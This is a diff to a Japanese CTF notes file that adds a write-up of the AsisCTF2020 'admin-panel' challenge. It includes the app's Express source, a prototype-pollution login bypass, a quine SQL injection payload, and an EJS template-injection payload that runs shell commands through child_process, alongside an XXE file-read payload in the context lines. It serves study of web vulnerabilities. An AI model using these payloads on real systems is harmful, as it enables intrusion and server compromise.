@@ -276,10 +276,154 @@ if ($type === "list") {
 ```txt
 4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
 ```
-## 
+## Prototype pollution / Quine SQL Injection / Template Injection (AsisCTF2020 admin-panel)
+https://vuln.live/blog/10  
+https://github.com/TeamGreyFang/CTF-Writeups/tree/master/AsisCTF2020/admin-panel  
 - **entrypoint**  
-- **payload**  
+app.js, router/main.js, package.jsonが配布されているらしい。  
+flagは`app.locals.flag`にありそう。  
+```js
+// app.js
+const express = require('express');
+const app = express();
+const session = require('express-session');
+const db = require('better-sqlite3')('./db.db', {readonly: true});
+const cookieParser = require("cookie-parser");
+const FileStore = require('session-file-store')(session);
+const fs = require('fs');
 
+app.locals.flag = "REDACTED"
+app.use(express.static('static'));
+app.use(cookieParser());
+app.use(express.urlencoded({extended: false}));
+app.use(express.json());
+app.set('views', __dirname + '/views');
+app.set('view engine', 'ejs');
+app.engine('html', require('ejs').renderFile);
+
+const server = app.listen(3000, function(){
+    console.log("Server started on port 3000")
+});
+
+app.use(session({
+    secret: 'REDACTED',
+    resave: false,
+    saveUninitialized: true,
+    store: new FileStore({path: __dirname+'/sessions/'})
+}));
+
+const router = require('./router/main')(app, db, fs);
+```
+SQLInjectionでadminになった後に、File uploadで`test.ejs`とかで中に`<%=flag%>`というテンプレートを作成すれば変数の中身を表示できる。  
+```js
+// router/main.js
+module.exports = function(app, db, fs){
+    app.get('/', function(req, res){
+        res.render('index.html')
+    });
+
+    app.post('/login', function(req, res){
+        var user = {};
+        var tmp = req.body;
+        var row;
+
+        if(typeof tmp.pw !== "undefined"){
+            tmp.pw = tmp.pw.replace(/\\/gi,'').replace(/\'/gi,'').replace(/-/gi,'').replace(/#/gi,'');
+        }
+
+        for(var key in tmp){
+            user[key] = tmp[key];
+        }
+
+        if(req.connection.remoteAddress !== '::ffff:127.0.0.1' && tmp.id === 'admin' || typeof user.id === "undefined"){
+            user.id = 'guest';
+        }
+        req.session.user = user.id;
+
+        if(typeof user.pw !== "undefined"){
+            row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();
+            if(typeof row !== "undefined"){
+                req.session.isAdmin = (row.pw === user.pw);
+            }else{
+                req.session.isAdmin = false;
+            }
+            if(req.session.isAdmin && req.session.user === 'admin'){
+                res.statusCode = 302;
+                res.setHeader('Location','admin');
+                res.end();
+            }else{
+                res.end("Access Denied!");
+            }
+        }else{
+            res.end("No password given.");
+        }
+    });
+
+    app.get('/admin', function(req, res){
+        if(typeof req.session.isAdmin !== "undefined" && req.session.isAdmin && req.session.user === 'admin'){
+            if(typeof req.query.test !== "undefined"){
+                res.render(req.query.test);
+            }else{
+                res.render("admin.html");
+            }
+        }else{
+            res.end("Access Denied!");
+        }
+    });
+
+    app.post('/upload', function(req, res){
+        if(typeof req.session.isAdmin !== "undefined" && req.session.isAdmin && req.session.user === 'admin'){
+            if(typeof req.body.name !== "undefined" && typeof req.body.file !== "undefined"){
+                var fname = req.body.name;
+                var dir = './views/upload/'+req.session.id;
+                var contents = req.body.file;
+
+                !fs.existsSync(dir) && fs.mkdirSync(dir);
+                fs.writeFileSync(dir+'/'+fname, contents);
+                res.end("Done.");
+            }else{
+                res.end("Something's wrong");
+            }
+        }else{
+            res.end("Permission Denied!");
+        }
+    });
+}
+```
+あとPrototype Pollutionにも脆弱らしい。  
+以下のようにPOSTでリクエストして`tmp`に値を入れると、`tmp.__proto__`に``{"id":"admin", "pw": " '#~` "}``という値が入る。  
+このとき、`tmp.__proto__`は`Object.prototype`と同じなので`Object.prototype.id`,`Object.prototype.pw`に値が入ることになる。  
+つまり、`tmp.id`,`tmp.pw`には値は入らないので`if(typeof tmp.pw !== "undefined"){`のpwのフィルタリングをbypassできる。  
+for文で`user[key]=tmp[key]`のように値を代入して行く場合、`user.id`とかは定義されていない(`user={}`で初期化されてるだけ)ので`user.__proto__.id`を調べに行く。ここで、`user.__proto__.id`は`Object.prototype.id`と同義なので`admin`とかの値が入る。  
+`for(var key in tmp){`では`key`には`"__proto__"`一つだけが入るのでは？？と思ったけどどうやらそうではなく、`"pw"`,`"id"`が入るらしい…。`"__proto__"`の場合だけ特別なんかな？？？   
+```txt
+{
+	"__proto__":{"id":"admin", "pw": " '#~` "}
+}
+```
+さらにこのDBには値がないも入っていないため、`row.pw === user.pw`を突破できない。  
+そのため、Quine SQL Injectionという、入力したSQL構文と丸切り同じSQL構文を検索結果として返す特殊なSQL Payloadを使うらしい。  
+```txt
+{
+	"__proto__":{"pw":"' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--","id":"admin"}
+}
+```
+これでadminになった後に、以下のようなFlagを表示させるEJSをUploadして実行する  
+```txt
+  <%- global.process.mainModule.require('child_process').execSync('cat app.js') %>
+```
+- **payload**  
+```txt
+{
+	"__proto__":{"pw":"' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--","id":"admin"}
+}
+```
+```txt
+  <%- global.process.mainModule.require('child_process').execSync('cat app.js') %>
+```
+- **Prototype Pollutionの参考**  
+https://qiita.com/koki-sato/items/7b78f9ec139230b95beb  
+https://jovi0608.hatenablog.com/entry/2018/10/19/083725  
 ## 
 - **entrypoint**  
 - **payload**  
